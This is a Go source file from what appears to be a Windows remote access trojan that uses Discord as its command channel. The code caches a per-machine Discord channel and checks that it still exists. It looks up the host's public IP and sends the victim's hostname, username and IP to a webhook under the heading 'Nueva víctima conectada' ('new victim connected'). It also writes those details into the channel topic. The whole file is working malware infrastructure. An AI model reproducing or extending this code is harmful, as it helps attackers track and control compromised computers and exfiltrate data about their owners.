//go:build windows

package bot

import (
	"context"
	"encoding/json"
	"log/slog"
	"os"
	"path/filepath"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
)

type channelCache struct {
	ID  string `json:"id"`
	Num int    `json:"num"`
}

func channelCachePath() string {
	return filepath.Join(config.StateDir(), "channel.json")
}

func legacyChannelCachePath() string {
	dir, err := os.UserConfigDir()
	if err != nil || dir == "" {
		return ""
	}
	return filepath.Join(dir, config.DataDirName, "channel.json")
}

func cachedChannel() (string, int) {
	if c, ok := readChannelCache(channelCachePath()); ok {
		return c.ID, c.Num
	}
	if legacy := legacyChannelCachePath(); legacy != "" {
		if c, ok := readChannelCache(legacy); ok {
			saveChannel(c.ID, c.Num)
			return c.ID, c.Num
		}
	}
	return "", 0
}

func readChannelCache(path string) (channelCache, bool) {
	if path == "" {
		return channelCache{}, false
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		return channelCache{}, false
	}
	var c channelCache
	if err := json.Unmarshal(raw, &c); err != nil || c.ID == "" {
		return channelCache{}, false
	}
	return c, true
}

func saveChannel(id string, num int) {
	path := channelCachePath()
	if path == "" || id == "" {
		return
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return
	}
	raw, err := json.Marshal(channelCache{ID: id, Num: num})
	if err != nil {
		return
	}
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, raw, 0o600); err != nil {
		return
	}
	if err := os.Rename(tmp, path); err != nil {
		slog.Debug("sessionmgr: no se pudo guardar el canal", "err", err)
	}
}

func refreshCachedSession(s *discordgo.Session, session *Session) {
	channels, err := guildChannelsBounded(s, 20*time.Second)
	if err != nil {
		slog.Debug("sessionmgr: verificación del canal en caché falló", "err", err)
		return
	}

	var found *discordgo.Channel
	for _, channel := range channels {
		if channel.ID == session.ChannelID {
			found = channel
			break
		}
	}
	if found == nil {
		slog.Warn("sessionmgr: el canal cacheado ya no existe", "channel", session.ChannelID)
		_ = os.Remove(channelCachePath())
		return
	}

	sessionMu.Lock()
	session.ConnectedAt = time.Now()
	sessionMu.Unlock()
	slog.Debug("sessionmgr: canal verificado", "channel", found.ID)
}

func resolveCachedIP(s *discordgo.Session, session *Session) {
	ip := util.PublicIP(context.Background())
	if ip == "" || ip == "desconocida" {
		slog.Debug("sessionmgr: IP pública no disponible en el arranque en caché")
		return
	}

	sessionMu.Lock()
	session.IP = ip
	hostname, username, channelID := session.Hostname, session.Username, session.ChannelID
	sessionMu.Unlock()

	slog.Info("bot: ip pública resuelta", "ip", ip)

	updatePanelIP(s, session)

	if _, err := channelEditBounded(s, channelID, &discordgo.ChannelEdit{
		Topic: topicFor(hostname, username, ip),
	}, 20*time.Second); err != nil {
		slog.Debug("sessionmgr: no se pudo refrescar el topic con la IP", "err", err)
	}

	_ = util.PostWebhook("🟢 Nueva víctima conectada", 3066993, []util.EmbedField{
		{Name: "hostname", Value: hostname, Inline: true},
		{Name: "usuario", Value: username, Inline: true},
		{Name: "IP", Value: ip, Inline: true},
		{Name: "canal", Value: channelID, Inline: true},
	})
}

func topicFor(hostname, username, publicIP string) string {
	return hostname + " | " + username + " | " + publicIP + " | " + instanceID +
		" | conectado " + time.Now().UTC().Format(time.RFC3339)
}
